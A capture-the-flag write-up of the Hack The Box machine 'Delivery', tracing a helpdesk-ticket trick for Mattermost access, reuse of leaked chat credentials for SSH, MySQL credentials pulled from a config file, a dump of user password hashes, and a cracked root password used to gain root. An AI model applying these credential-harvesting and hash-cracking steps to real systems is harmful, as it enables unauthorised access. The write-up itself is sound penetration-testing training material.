# CTF - [Delivery](https://app.hackthebox.eu/machines/Delivery)

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
| http-methods: 80
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.2
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Checked out the site on port 80, there's a portal for admins in `delivery.htb:8065`, we can create an account through `helpdesk.delivery.htb`. 
<br/><br/>
![Screenshot_2021-10-19_22_23_53](https://user-images.githubusercontent.com/59718043/138017634-5b0583c4-b126-4bb6-997c-9b0e601a9dfa.png)
<br/><br/>
Edited `/etc/hosts` and included delivery.htb and helpdesk.delivery.htb.
<br/><br/>
![Screenshot_2021-10-19_22_26_18](https://user-images.githubusercontent.com/59718043/138018087-0432a42a-fae6-41c6-a1ff-b8882a260eb7.png)
<br/><br/>
Opened a ticket through this portal, used the `Check Ticket Status` functionality to login to view ticket status.
<br/><br/>
Then I went to delivery.htb:8065 to create a new account, checked back on the ticket status page and saw a verification link. This link took me to a login page.
Used the credentials to log in, this brought me to the MatterMost server.
<br/><br/>
![Screenshot_2021-10-19_23_27_16](https://user-images.githubusercontent.com/59718043/138023512-752dcf27-0df6-4f76-a1f0-29c70fb62b6a.png)
<br/><br/>
The Internal public channel contains some credentials: 
<br/><br/>
![here](https://user-images.githubusercontent.com/59718043/138201913-a1306ab6-aade-40ef-ae35-8c17040d6dde.png)
```
maildeliverer:Youve_G0t_Mail!
```
Ran a gobuster scan on the ticketing system page to find the server-side portal:
<br/><br/>
![Screenshot_2021-10-21_00-24-21](https://user-images.githubusercontent.com/59718043/138211383-2828e6a1-1475-47ac-9fca-72417dd9bd01.png)
<br/><br/>
Found the ticketing system server-side portal on `http://helpdesk.delivery.htb/scp/login.php`. Used `maildeliverer:Youve_G0t_Mail!` to log in.
<br/><br/>
![Screenshot_2021-10-21_00_30_23](https://user-images.githubusercontent.com/59718043/138211896-120c7a88-2a3c-4ff1-95ca-191579ccf69e.png)
<br/><br/>
Also found out that the same credentials can be used to SSH into the server.
```
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ ls
user.txt
```
Mattermost stores its configuration files in `/opt/mattermost/config/config.json`. This file contains SQL database credentials.
```
    "SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readT$
        "DataSourceReplicas": [],
        "DataSourceSearchReplicas": [],
        "MaxIdleConns": 20,
        "ConnMaxLifetimeMilliseconds": 3600000,
        "MaxOpenConns": 300,
        "Trace": false,
        "AtRestEncryptKey": "n5uax3d4f919obtsp1pw1k5xetq1enez",
        "QueryTimeout": 30,
        "DisableDatabaseSearch": false
    }
```
`mmuser:Crack_The_MM_Admin_PW` --- used these credentials to log in to mysql.
```
mysql -u mmuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 38
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```
Found the mattermost database; found the root credentials under the Users table.
```
MariaDB [mattermost]> select id, Username, Password from Users;
+----------------------------+----------------------------------+--------------------------------------------------------------+
| id                         | Username                         | Password                                                     |
+----------------------------+----------------------------------+--------------------------------------------------------------+
| 64nq8nue7pyhpgwm99a949mwya | surveybot                        |                                                              |
| 6akd5cxuhfgrbny81nj55au4za | c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 6wkx1ggn63r7f8q1hpzp7t4iiy | 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| dijg7mcf4tf3xrgxi5ntqdefma | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| hatotzdacb8mbe95hm4ei8i7ny | ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| jing8rk6mjdbudcidw6wz94rdy | channelexport                    |                                                              |
| n9magehhzincig4mm97xyft9sc | 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------+----------------------------------+--------------------------------------------------------------+
```
```
dijg7mcf4tf3xrgxi5ntqdefma | root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```
<br/><br/>
Stored the hash in a file called `hash.txt`.
<br/><br/>
Looking back at our internal public channel on the website, someone in the chat mentioned that the password should be a variant of `PleaseSubscribe!`, they also mentioned that attackers could use hashcat rules to crack it.
<br/><br/>
Used hashcat to create variants of `PleaseSubscribe!`:
```
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout file.txt > dict.txt
```
Used johntheripper to crack the password:
```
└─$ john --wordlist=dict.txt hash.txt 
Created directory: /home/ghost/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
PleaseSubscribe!21 (?)     
1g 0:00:00:00 DONE (2021-11-18 22:35) 1.219g/s 87.80p/s 87.80c/s 87.80C/s PleaseSubscribe!..PlesPles
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Root:PleaseSubscribe!21
```
maildeliverer@Delivery:~$ su root
Password: 
root@Delivery:/home/maildeliverer# 
```
